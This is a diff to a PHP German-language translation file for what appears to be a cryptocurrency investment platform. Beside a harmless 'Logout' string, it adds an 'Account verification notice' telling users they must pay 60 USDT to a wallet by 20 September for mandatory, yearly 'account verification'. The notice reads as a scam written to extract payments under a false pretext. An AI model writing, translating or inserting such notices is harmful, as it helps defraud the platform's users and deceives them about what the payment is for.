@@ -115,4 +115,16 @@ return [
     'Investment' => 'Investition',
     'Wallet Address' => 'Wallet-Adresse',
     'Virtual' => 'Virtuell',
+    'Logout' => 'Abmelden',
+    'Account verification notice' => <<<'TEXT'
+Liebe Partner!
+
+Für die ordnungsgemäße Funktionsweise der Plattform und die Fähigkeit, alle Zahlungen und Rückerstattungen zu verarbeiten, ist es wichtig, genaue und aktuelle Benutzerdaten zu haben.
+
+In dieser Hinsicht ist es erforderlich, das Kontoüberprüfungsverfahren abzuschließen. Es erfordert eine Zahlung von 60 USDT an die hier angegebene Brieftasche. Danach wird Ihr Konto aktiviert und das System erhält die erforderlichen Daten für die korrekte Bearbeitung von Zahlungen.
+
+Diese Mittel werden angewiesen, um den stabilen Betrieb der Website und der Benutzeridentifikation zu unterstützen, um den Schutz der Konten zu gewährleisten und auf dem neuesten Stand zu halten.
+
+Die Zahlung muss bis zum 20. September erfolgen. Dieses Verfahren ist obligatorisch und wird jährlich berechnet.
+TEXT,
 ];
